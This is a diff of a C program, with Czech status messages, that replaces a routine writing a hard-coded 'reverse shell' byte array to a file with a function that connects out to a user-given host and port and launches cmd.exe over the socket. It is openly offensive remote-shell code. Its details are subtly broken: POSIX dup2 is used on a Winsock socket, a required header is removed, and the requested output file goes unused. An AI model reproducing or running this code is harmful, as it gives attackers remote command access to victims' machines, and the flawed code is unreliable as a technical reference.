@@ -1,56 +1,76 @@
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <winsock2.h>
-#include <ws2tcpip.h>
+#include <windows.h>
 
-#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "ws2_32.lib") // Link with ws2_32.lib (Windows Socket Library)
 
-void generate_payload(const char *lhost, const char *lport, const char *output_file) {
-    FILE *file = fopen(output_file, "wb");
-    if (!file) {
-        printf("Error: Unable to create the output file.\n");
+void create_reverse_shell(const char *lhost, int lport) {
+    WSADATA wsa;
+    SOCKET sock;
+    struct sockaddr_in server;
+    char buffer[1024];
+
+    // Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        printf("WSAStartup failed\n");
         return;
     }
 
-    // Payload template (reverse shell)
-    unsigned char payload[] = {
-        0xfc, 0xe8, 0x87, 0x00, 0x00, 0x00, 0x53, 0x56, 0x57, 0x8b, 0x7c, 0x24, 0x1c, 0x8b, 0xf9, 0x8b, 0x7f, 
-        0x1c, 0x8b, 0x77, 0x20, 0x8b, 0x47, 0x24, 0x85, 0xc0, 0x74, 0x07, 0x8b, 0x47, 0x1c, 0x83, 0xec, 0x0c, 
-        0x53, 0x56, 0x57, 0x8b, 0x7c, 0x24, 0x08, 0x8b, 0x47, 0x04, 0x85, 0xc0, 0x74, 0x67, 0x8b, 0x7f, 0x0c, 
-        0x8b, 0x47, 0x10, 0x8b, 0x77, 0x14, 0x8b, 0x4f, 0x18, 0x8b, 0x57, 0x1c, 0x8b, 0x77, 0x20, 0x8b, 0x5f, 
-        0x24, 0x83, 0xc4, 0x04, 0x53, 0x56, 0x57, 0x8b, 0x7c, 0x24, 0x1c, 0x8b, 0x47, 0x1c, 0x8b, 0x57, 0x20, 
-        0x8b, 0x7f, 0x24, 0x85, 0xc0, 0x74, 0x16, 0x8b, 0x47, 0x28, 0x83, 0xec, 0x0c, 0x8b, 0x7f, 0x2c, 0x8b, 
-        0x47, 0x30, 0x8b, 0x77, 0x34, 0x8b, 0x4f, 0x38, 0x8b, 0x57, 0x3c, 0x8b, 0x77, 0x40, 0x83, 0xc4, 0x04, 
-        0x53, 0x56, 0x57, 0x8b, 0x7c, 0x24, 0x08, 0x8b, 0x47, 0x04, 0x85, 0xc0, 0x74, 0x67, 0x8b, 0x77, 0x0c, 
-        0x8b, 0x77, 0x10, 0x8b, 0x57, 0x14, 0x8b, 0x6f, 0x18, 0x8b, 0x47, 0x1c, 0x8b, 0x57, 0x20, 0x8b, 0x77, 
-        0x24, 0x8b, 0x57, 0x28, 0x8b, 0x77, 0x2c, 0x8b, 0x47, 0x30, 0x8b, 0x57, 0x34, 0x8b, 0x77, 0x38, 0x8b, 
-        0x47, 0x3c, 0x8b, 0x57, 0x40, 0x8b, 0x77, 0x44, 0x83, 0xc4, 0x04
-    };
+    // Create socket
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+        printf("Socket creation failed\n");
+        WSACleanup();
+        return;
+    }
 
-    fwrite(payload, sizeof(payload), 1, file);
+    // Set up server address
+    server.sin_family = AF_INET;
+    server.sin_port = htons(lport);
+    server.sin_addr.s_addr = inet_addr(lhost);
 
-    printf("[*] Payload generován s LHOSTEM %s a LPORTEM %s!\n", lhost, lport);
+    // Connect to the server (LHOST: LPORT)
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
+        printf("Connection failed\n");
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
 
-    fclose(file);
+    // Redirect standard input/output/error to the socket
+    dup2((int)sock, 0);  // stdin
+    dup2((int)sock, 1);  // stdout
+    dup2((int)sock, 2);  // stderr
+
+    // Execute the command shell (cmd.exe)
+    _execvp("cmd.exe", NULL);
+
+    // Cleanup
+    closesocket(sock);
+    WSACleanup();
 }
 
 int main() {
-    char lhost[50], lport[6], output[100];
+    char lhost[100], output_file[100];
+    int lport;
 
+    // Get LHOST
     printf("ENTER LHOST: ");
     fgets(lhost, sizeof(lhost), stdin);
     lhost[strcspn(lhost, "\n")] = 0;  // Remove newline character
 
+    // Get LPORT
     printf("ENTER LPORT: ");
-    fgets(lport, sizeof(lport), stdin);
-    lport[strcspn(lport, "\n")] = 0;  // Remove newline character
+    scanf("%d", &lport);
+    getchar();  // Consume the newline character left by scanf
 
+    // Get OUTPUT file
     printf("ENTER OUTPUT: ");
-    fgets(output, sizeof(output), stdin);
-    output[strcspn(output, "\n")] = 0;  // Remove newline character
+    fgets(output_file, sizeof(output_file), stdin);
+    output_file[strcspn(output_file, "\n")] = 0;  // Remove newline character
 
-    generate_payload(lhost, lport, output);
+    // Generate and execute reverse shell
+    printf("[*] Payload generován! s LHOSTEM %s a LPORTEM %d!\n", lhost, lport);
+    create_reverse_shell(lhost, lport);
 
     return 0;
 }
